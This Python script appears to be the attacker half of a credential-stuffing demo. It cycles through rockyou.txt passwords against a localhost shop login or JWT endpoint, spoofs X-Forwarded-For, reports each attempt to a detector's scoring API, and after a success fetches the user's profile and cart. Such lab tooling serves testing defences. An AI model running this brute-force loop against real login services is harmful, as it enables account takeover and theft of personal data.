import requests
import itertools
import time
import argparse
from pathlib import Path
from typing import Optional, Union


# Location of the bundled password list used for credential stuffing attacks.
# This uses ``__file__`` so the script works no matter the working directory.
ROCKYOU_PATH = Path(__file__).with_name("data").joinpath("rockyou.txt")

REQUEST_TIMEOUT = 3


def load_creds(
    path: Union[Path, str, None] = ROCKYOU_PATH, limit: Optional[int] = None
):
    """Load credentials from a file with an optional limit.

    *path* may be a :class:`pathlib.Path` or string. By default the bundled
    ``rockyou.txt`` file located in the ``data`` directory alongside this
    script is used.
    """

    path = Path(path)

    passwords = []
    with path.open(newline="", encoding="latin-1") as f:
        for i, line in enumerate(f):
            passwords.append(line.strip())
            if limit and i + 1 >= limit:
                break
    return passwords


passwords = load_creds(limit=5000)
pool = itertools.cycle(passwords)


def attack(
    rate_per_sec=10,
    attempts=50,
    use_jwt=False,
    score_base="http://localhost:8001",
    shop_url="http://localhost:3005",
    api_key=None,
    chain_url="/api/security/chain",
):
    """Send repeated login attempts and report detection results.

    Tracks how many attempts until the first successful login and how
    long that success took. Useful for demonstrating credential stuffing
    with and without JWT protection.
    """

    success = 0
    blocked = 0
    first_success_attempt = None
    first_success_time = None
    first_user_info = None
    first_cart = None
    start = time.time()

    session = requests.Session()
    attempted = 0

    base_headers = {}
    chain = None
    chain_endpoint = None
    if api_key:
        base_headers["X-API-Key"] = api_key
        if chain_url:
            chain_endpoint = (
                chain_url if chain_url.startswith("http") else f"{score_base}{chain_url}"
            )
            try:
                resp = session.get(chain_endpoint, headers=base_headers, timeout=3)
                if resp.ok:
                    chain = resp.json().get("chain")
            except Exception as exc:
                print("CHAIN ERROR:", exc)

    try:
        for i in range(1, attempts + 1):
            attempted = i
            pwd = next(pool)
            ip = "10.0.0.1"
            user = "alice"

            token = None
            if use_jwt:
                login_resp = session.post(
                    f"{score_base}/api/token",
                    data={"username": user, "password": pwd},
                    timeout=3,
                )
                login_ok = login_resp.status_code == 200
                token = login_resp.json().get("access_token") if login_ok else None
                if token:
                    session.get(
                        f"{score_base}/api/alerts",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=3,
                    )
            else:
                login_resp = session.post(
                    f"{shop_url}/login",
                    json={"username": user, "password": pwd},
                    headers={"X-Forwarded-For": ip},
                    timeout=3,
                )
                login_ok = login_resp.status_code == 200

            score_payload = {
                "client_ip": ip,
                "auth_result": "success" if login_ok else "failure",
                "with_jwt": use_jwt,
            }

            try:
                headers = dict(base_headers)
                if chain:
                    headers["X-Chain-Password"] = chain
                score_resp = requests.post(
                    f"{score_base}/score",
                    json=score_payload,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT,
                )
                if score_resp.json().get("status") == "blocked":
                    blocked += 1
                if chain_endpoint:
                    try:
                        resp = session.get(
                            chain_endpoint, headers=base_headers, timeout=3
                        )
                        if resp.ok:
                            chain = resp.json().get("chain")
                    except Exception as exc:
                        print("CHAIN ERROR:", exc)
            except requests.exceptions.RequestException as exc:
                print(f"SCORE ERROR contacting {score_base}/score: {exc}")

            if login_ok:
                success += 1
                if token:
                    try:
                        info_resp = requests.get(
                            f"{score_base}/api/me",
                            headers={"Authorization": f"Bearer {token}"},
                            timeout=3,
                        )
                        if info_resp.status_code == 200:
                            data = info_resp.json()
                            if first_user_info is None:
                                first_user_info = data
                            print(f"Retrieved user data: {data}")
                    except Exception as exc:
                        print("INFO ERROR:", exc)
                if first_cart is None:
                    try:
                        cart_resp = session.get(
                            f"{shop_url}/cart",
                            headers={"X-Reauth-Password": pwd},
                            timeout=3,
                        )
                        if cart_resp.status_code == 200:
                            first_cart = cart_resp.json()
                            print(f"Retrieved cart: {first_cart}")
                    except Exception as exc:
                        print("CART ERROR:", exc)
                if first_success_attempt is None:
                    first_success_attempt = i
                    first_success_time = time.time() - start

            time.sleep(1 / rate_per_sec)
    except KeyboardInterrupt:
        print("Interrupted by user, printing summary...")

    total_time = time.time() - start
    print(f"Attempts: {attempted}, successes: {success}, blocked: {blocked}")
    if first_success_attempt:
        print(
            f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
        )
    print(f"Total elapsed time: {total_time:.2f}s")
    if first_user_info:
        print(f"First user data: {first_user_info}")
    if first_cart:
        print(f"First cart: {first_cart}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
    parser.add_argument("--rate", type=float, default=5, help="Attempts per second")
    parser.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
    parser.add_argument(
        "--score-base",
        default="http://localhost:8001",
        help="Detector API base URL",
    )
    parser.add_argument("--shop-url", default="http://localhost:3005", help="Demo shop base URL")
    parser.add_argument("--api-key", help="API key for protected endpoints")
    parser.add_argument(
        "--chain-url",
        default="/api/security/chain",
        help="Endpoint to fetch rotating chain value",
    )
    args = parser.parse_args()
    attack(
        rate_per_sec=args.rate,
        attempts=args.attempts,
        use_jwt=args.jwt,
        score_base=args.score_base,
        shop_url=args.shop_url,
        api_key=args.api_key,
        chain_url=args.chain_url,
    )
